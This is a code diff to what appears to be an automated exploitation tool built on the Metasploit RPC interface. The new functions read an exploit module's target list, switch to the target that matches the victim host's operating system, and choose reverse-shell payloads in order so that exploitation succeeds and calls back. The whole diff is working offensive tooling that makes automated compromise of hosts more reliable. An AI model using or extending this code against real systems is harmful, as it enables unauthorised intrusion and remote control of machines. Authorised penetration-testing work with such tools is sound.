@@ -686,7 +686,9 @@ class MsfClient:
         try:
             modref = _strip_type(candidate.module)
             exploit = self._client.modules.use("exploit", modref)
-            payload_name = _select_payload(exploit, candidate.module, host)
+            tgt_platform = self._align_target(exploit, candidate.module, host)
+            payload_name = _select_payload(exploit, candidate.module, host,
+                                           platform=tgt_platform)
             if payload_name is None:
                 return self._blocked(candidate, rhost, "no compatible payload")
             payload = self._client.modules.use("payload", payload_name)
@@ -783,6 +785,46 @@ class MsfClient:
                 except Exception:
                     pass
             self._lport_release(lport)
+
+    def _align_target(self, exploit, full_module, host):
+        """Pick the module target that matches the host OS and set it, so the payload
+        chosen next agrees with the target and MSF accepts the execute. A multi-target
+        exploit defaults to its first target, which can be a different OS than the host
+        (exploit/multi/mysql/mysql_udf_payload defaults to Windows); firing a host-OS
+        payload against that default target is what returns no uuid. Returns the
+        payload platform implied by the selected target, or None to fall back to the
+        path/host derivation. Never raises; on any RPC problem the module stays on its
+        default target and payload selection falls back."""
+        host_family = _platform_from_host(host)
+        mtype, _, ref = (full_module or "").partition("/")
+        if not ref:
+            mtype, ref = "exploit", _strip_type(full_module)
+        try:
+            info = self._client.call("module.info", [mtype, ref])
+            raw = info.get("targets") if isinstance(info, dict) else None
+        except Exception as e:
+            logger.debug("could not read targets for %s: %s", full_module, e)
+            return None
+        if not isinstance(raw, dict):
+            return None
+        targets = {}
+        for k, v in raw.items():
+            try:
+                targets[int(k)] = v
+            except (TypeError, ValueError):
+                continue
+        chosen = _choose_target(targets, host_family)
+        if chosen is not None:
+            try:
+                exploit.target = chosen
+                logger.info("set target %d (%s) on %s for host '%s'",
+                            chosen, targets.get(chosen), full_module, host_family)
+            except Exception as e:
+                logger.debug("could not set target %d on %s: %s",
+                             chosen, full_module, e)
+                chosen = None
+        idx = chosen if chosen is not None else 0
+        return _platform_from_target(targets.get(idx, ""))
 
     def _blocked(self, candidate, rhost, detail):
         """Log a blocked fire at WARNING and return the blocked tuple. A blocked
@@ -1072,6 +1114,50 @@ def _platform_from_module(full):
     return None
 
 
+def _platform_from_target(name):
+    """Payload platform implied by a module TARGET name, or None when the name
+    carries none (Automatic/Generic with no language). "command"/"unix" is tested
+    before "linux" so a "Linux/Unix Command" target resolves to the unix command
+    family rather than native linux shellcode."""
+    n = (name or "").lower()
+    if not n:
+        return None
+    if "command" in n or "unix" in n:
+        return "unix"
+    if "java" in n:
+        return "java"
+    if "php" in n:
+        return "php"
+    if "python" in n:
+        return "python"
+    if "win" in n:
+        return "windows"
+    if "linux" in n:
+        return "linux"
+    if "osx" in n or "mac os" in n or "mac_os" in n:
+        return "osx"
+    return None
+
+
+def _choose_target(targets, host_family):
+    """Index of the module target to fire against a host of host_family, or None to
+    keep the module default. targets is {index: name}. The default is kept when its
+    platform is host-agnostic (Java, a command shell, Automatic) or already compatible
+    with the host; only when the default is a specific OS that does NOT match the host
+    (a Windows default against a Linux host) is it switched to the first target whose
+    platform does match, so payload and target agree and MSF accepts the execute."""
+    if not targets:
+        return None
+    default_plat = _platform_from_target(targets.get(0, ""))
+    if default_plat is None or _family_compatible(default_plat, host_family):
+        return None
+    for idx in sorted(targets):
+        p = _platform_from_target(targets[idx])
+        if p and p not in _AGNOSTIC_PLATFORMS and _family_compatible(p, host_family):
+            return idx
+    return None
+
+
 def _platform_from_host(host):
     text = f"{getattr(host, 'os_match', '')}".lower()
     if not text:
@@ -1180,7 +1266,7 @@ def _payload_prefs(platform, x64):
     return prefs
 
 
-def _select_payloads(exploit, full_module, host):
+def _select_payloads(exploit, full_module, host, platform=None):
     """Return compatible reverse payloads for this module in reliability order,
     best first. This is the ordered form of _select_payload used by the fire
     fallback: if the first payload fires but never calls back, the next is tried.
@@ -1194,7 +1280,8 @@ def _select_payloads(exploit, full_module, host):
         return []
     if not compat:
         return []
-    platform = _platform_from_module(full_module) or _platform_from_host(host)
+    if platform is None:
+        platform = _platform_from_module(full_module) or _platform_from_host(host)
     x64 = _is_x64(host)
     ordered = []
     seen = set()
@@ -1222,10 +1309,10 @@ def _select_payloads(exploit, full_module, host):
     return ordered
 
 
-def _select_payload(exploit, full_module, host):
+def _select_payload(exploit, full_module, host, platform=None):
     """Pick the single best reverse payload (first of _select_payloads). Kept for
     callers that want one payload without the fallback loop."""
-    ordered = _select_payloads(exploit, full_module, host)
+    ordered = _select_payloads(exploit, full_module, host, platform=platform)
     return ordered[0] if ordered else None
 
 
